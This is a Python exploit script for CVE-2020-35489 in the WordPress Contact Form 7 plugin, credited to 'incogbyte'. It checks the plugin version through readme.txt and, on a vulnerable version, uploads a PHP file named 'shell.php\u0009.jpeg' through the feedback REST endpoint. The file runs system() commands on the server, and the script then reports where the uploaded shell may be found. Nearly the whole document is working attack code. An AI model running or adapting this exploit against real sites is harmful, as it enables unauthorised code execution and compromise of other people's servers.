import argparse
import requests
import re

"""
author: incogbyte
tw: incogbyte

Only for information purpose :)
"""

menu = argparse.ArgumentParser(description="Exploit CVE-2020-35489.py")
menu.add_argument("-u", "--url", type=str, required=True, help="[*] wordpress site")
args = menu.parse_args()

url = args.url



VULNERABLE_VERSIONS = [
    '5.3.1',
    '5.2.2',
    '5.3',
    '5.2'
]

print(f"[*] {url}\n")

def check_version(text):
    pattern = r"Stable tag: (\d+\.\d+\.\d+)"
    match = re.search(pattern, text)
    if match:
        stable_tag = match.group(1)
        version_match = r"\d+\.\d+\.\d+"
        version_number = re.search(version_match, stable_tag).group()
        return version_number


def verify_plugin(url):
    contact_form_endpoint = '/wp-content/plugins/contact-form-7/readme.txt'
    check_url = url + contact_form_endpoint
    try:
        resp = requests.get(url=check_url, headers={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36"
        })
        if resp.status_code == 200 and 'Contact Form 7' in resp.text:
            version = check_version(resp.text)
            print(f"[*] Found contact form 7\nVersion: {version}")
            if version in VULNERABLE_VERSIONS:
                exploit(url)
    except (requests.exceptions.HTTPError ,requests.exceptions.Timeout) as e:
        print(f"[!] Error: {e}\n")

def exploit(url):
    ### Lazy bugy way PR/Clone/Fork/Copy ...
    exploit_url = f"{url}/index.php?rest_route=/contact-form-7/v1/contact-forms/5/feedback"
    headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarycB1gsXork3iH9V4p", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36", "Origin": "http://localhost:8000", "Connection": "close"}
    data = "------WebKitFormBoundarycB1gsXork3iH9V4p\r\nContent-Disposition: form-data; name=\"your-name\"\r\n\r\ntest\r\n------WebKitFormBoundarycB1gsXork3iH9V4p\r\nContent-Disposition: form-data; name=\"your-email\"\r\n\r\nping@ping.com\r\n------WebKitFormBoundarycB1gsXork3iH9V4p\r\nContent-Disposition: form-data; name=\"your-subject\"\r\n\r\nping\r\n------WebKitFormBoundarycB1gsXork3iH9V4p\r\nContent-Disposition: form-data; name=\"your-message\"\r\n\r\nping\r\n------WebKitFormBoundarycB1gsXork3iH9V4p\r\nContent-Disposition: form-data; name=\"file-480\"; filename=\"shell.php\\u0009.jpeg\"\r\nContent-Type: application/x-php\r\n\r\n<?php\r\nsystem(\"echo 'testing' >> /tmp/pewpew\");\r\nsystem('cat /tmp/pewpew');\n?>\n\n\r\n------WebKitFormBoundarycB1gsXork3iH9V4p--\r\n"
    resp = requests.post(exploit_url, headers=headers, data=data)

    if resp.status_code == 200 and 'mail_sent' in resp.text:
        print(f"[*] vulnerable to [CVE-2020-35489] | verify path for miss config: {url}/wp-content/uploads/u0009.jpeg")

if __name__ == '__main__':
    verify_plugin(url=url)
